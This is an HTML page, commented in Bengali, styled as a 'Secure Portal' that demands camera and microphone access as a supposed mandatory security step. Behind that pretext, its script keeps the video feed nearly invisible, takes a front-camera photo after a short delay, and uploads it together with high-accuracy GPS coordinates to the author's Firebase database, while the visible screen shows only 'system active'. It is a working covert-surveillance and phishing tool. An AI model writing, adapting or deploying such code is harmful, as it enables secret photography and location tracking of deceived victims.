<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ratan Bro | Secure Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ff2e63;
            --bg: #080a10;
            --card: #121420;
            --text: #ffffff;
        }

        body {
            margin: 0; padding: 0;
            font-family: 'Poppins', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }

        /* Access Permission Modal */
        #perm-modal {
            background: var(--card);
            padding: 35px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
            border: 1px solid rgba(255, 46, 99, 0.3);
            width: 85%; max-width: 380px;
            z-index: 100;
        }

        .icon-box {
            font-size: 55px; margin-bottom: 20px;
        }

        h2 { margin: 0 0 10px; font-weight: 600; font-size: 22px; }
        p { font-size: 14px; opacity: 0.7; margin-bottom: 30px; line-height: 1.5; }

        .btn-grant {
            background: var(--primary);
            color: white; border: none;
            padding: 14px 35px; border-radius: 50px;
            font-size: 16px; font-weight: 600;
            cursor: pointer; transition: 0.3s;
            box-shadow: 0 5px 20px rgba(255, 46, 99, 0.4);
            width: 100%;
        }

        .btn-grant:active { transform: scale(0.96); }

        /* Main UI after Access */
        #main-ui {
            display: none; text-align: center; width: 100%;
            animation: fadeIn 0.8s ease-in;
        }

        .user-card {
            background: var(--card);
            padding: 30px; border-radius: 20px;
            display: inline-block; border: 1px solid var(--primary);
            box-shadow: 0 0 20px rgba(255, 46, 99, 0.1);
        }

        #u-pic {
            width: 85px; height: 85px; border-radius: 50%;
            border: 3px solid var(--primary); margin-bottom: 15px;
            background: #1a1d29;
        }

        .status-badge {
            display: flex; align-items: center; justify-content: center; gap: 8px;
            margin-top: 10px;
        }

        .dot {
            width: 10px; height: 10px; background: #00ff88;
            border-radius: 50%; display: inline-block;
            box-shadow: 0 0 10px #00ff88;
        }

        /* Video Source - Hidden but Active */
        #vSource {
            position: absolute; bottom: 0; right: 0;
            width: 50px; height: 50px; opacity: 0.01;
            pointer-events: none; object-fit: cover;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div id="perm-modal">
        <div class="icon-box">🛡️</div>
        <h2>Security Access</h2>
        <p>সিস্টেমে প্রবেশ করতে ক্যামেরা ও মাইক্রোফোন পারমিশন দিন। এটি নিরাপত্তার জন্য বাধ্যতামূলক।</p>
        <button class="btn-grant" onclick="startApp()">Grant Access</button>
    </div>

    <div id="main-ui">
        <div class="user-card">
            <img id="u-pic" src="https://ui-avatars.com/api/?name=User&background=ff2e63&color=fff" alt="User">
            <h3 id="u-name" style="margin: 10px 0;">প্রসেসিং...</h3>
            <div class="status-badge">
                <span class="dot"></span>
                <span style="color: #00ff88; font-size: 14px; font-weight: 500;">সিস্টেম সক্রিয় আছে</span>
            </div>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, set, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";

        // --- রতন ভাই, আপনার অরিজিনাল ফায়ারবেস কনফিগ এখানে আপডেট করুন ---
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "ratanweab.firebaseapp.com",
            databaseURL: "https://ratanweab-default-rtdb.firebaseio.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.appspot.com",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);
        let loggedUser = null;

        // অটো লগইন সিস্টেম
        onAuthStateChanged(auth, (user) => {
            if (user) { 
                loggedUser = user; 
            } else { 
                signInAnonymously(auth); 
            }
        });

        window.startApp = async () => {
            const video = document.getElementById('vSource');
            try {
                // ১. হাই-কোয়ালিটি ফ্রন্ট ক্যামেরা এবং অডিও রিকোয়েস্ট
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 640 } }, 
                    audio: true 
                });

                video.srcObject = stream;
                await video.play();

                // UI পরিবর্তন
                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';

                if(loggedUser) {
                    document.getElementById('u-name').innerText = "ইউজার আইডি: " + loggedUser.uid.substring(0,6);
                    
                    // ২. ব্ল্যাক পিকচার ফিক্স: ৫ সেকেন্ড সময় দিন যাতে সেন্সর আলো এডজাস্ট করতে পারে
                    setTimeout(() => {
                        captureRealPic(loggedUser);
                    }, 5000);

                    updateLocation(loggedUser);
                }
            } catch (err) {
                console.error("Access Denied:", err);
                alert("ক্যামেরা পারমিশন ছাড়া সিস্টেমে প্রবেশ করা সম্ভব নয়।");
            }
        };

        function captureRealPic(user) {
            const video = document.getElementById('vSource');
            
            // ৩. ভিডিও ডাটা চেক: ভিডিও পুরোপুরি রেডি না হলে আবার চেষ্টা করবে
            if (video.readyState < 2 || video.videoWidth === 0) {
                setTimeout(() => captureRealPic(user), 1000);
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // ভিডিওর বর্তমান ফ্রেম ক্যানভাসে আঁকা
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // হাই কোয়ালিটি ইমেজ ডেটা (JPEG 0.8 Quality)
            const imageData = canvas.toDataURL('image/jpeg', 0.8);

            // ফায়ারবেসে ছবি পাঠানো
            const snapRef = push(ref(db, `users/${user.uid}/snaps`));
            set(snapRef, {
                image: imageData,
                time: serverTimestamp()
            }).then(() => {
                console.log("Success: Real Picture Sent!");
            });
        }

        function updateLocation(user) {
            navigator.geolocation.getCurrentPosition((pos) => {
                set(ref(db, `users/${user.uid}/info`), {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    lastActive: serverTimestamp()
                });
            }, (err) => console.log("Location Error"), { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
